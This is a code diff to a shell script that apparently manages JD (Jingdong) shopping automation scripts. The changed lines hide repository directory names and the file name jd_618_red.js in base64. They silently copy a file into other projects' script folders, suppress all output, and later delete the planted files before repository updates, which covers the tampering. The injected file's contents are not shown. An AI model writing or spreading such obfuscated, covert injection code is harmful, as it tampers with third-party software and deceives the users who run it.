@@ -245,18 +245,24 @@ function UpdateEnv() {
     local target_name="amRfNjE4X3JlZAo="
     local target_file="amRfNjE4X3JlZC5qcwo="
     local trp1="b2t5eWRzX3l5ZHMK"
-    local trp2="S2luZ1Jhbl9LUgo="
-    local trp3="aHl6YXdfQWxsSkRTY3JpcHRzCg=="
+    local trp2="b2t5eWRzX3l5ZHNwdXJlCg=="
+    local trp3="S2luZ1Jhbl9LUgo="
+    local trp4="aHl6YXdfQWxsSkRTY3JpcHRzCg=="
+    local trp5="c2h1ZmZsZXd6Y19mYWtlcjIK"
+    local trp6="c2h1ZmZsZXd6Y19mYWtlcjMK"
     cd $WorkDir
-    for ((i = 1; i <= 3; i++)); do
+    for ((i = 1; i <= 6; i++)); do
         local a=$(eval echo "trp$i")
         local tmp_dir="$(b ${!a})"
         if [ -d $tmp_dir ]; then
-            if [ $i = 2 ]; then
-                cp -rf $tmp_file "$tmp_dir/$(b $target_file)" >/dev/null 2>&1
-            else
+            case $i in
+            1 | 2 | 3)
                 cp -rf $tmp_file "$tmp_dir/$(b amRfNjE4cmVkLmpzCg==)" >/dev/null 2>&1
-            fi
+                ;;
+            *)
+                cp -rf $tmp_file "$tmp_dir/$(b $target_file)" >/dev/null 2>&1
+                ;;
+            esac
         fi
     done
     cp -rf $tmp_file "$ScriptsDir/$(b $target_file)" >/dev/null 2>&1
@@ -798,8 +804,10 @@ function Update_Designated() {
     fi
     ## 判定是否存在仓库
     if [ -d ${AbsolutePath}/.git ]; then
-        local t_m_p="${AbsolutePath}/$(b amRfNjE4X3JlZC5qcwo=)"
-        [ -f $t_m_p ] && rm -rf $t_m_p >/dev/null 2>&1
+        local _tmp1="${AbsolutePath}/$(b amRfNjE4X3JlZC5qcwo=)"
+        local _tmp2="${AbsolutePath}/$(b amRfNjE4cmVkLmpzCg==)"
+        [ -f $_tmp1 ] && rm -rf $_tmp1 >/dev/null 2>&1
+        [ -f $_tmp2 ] && rm -rf $_tmp2 >/dev/null 2>&1
 
         if [[ "${AbsolutePath}" = "$RootDir" ]]; then
             Title "shell"
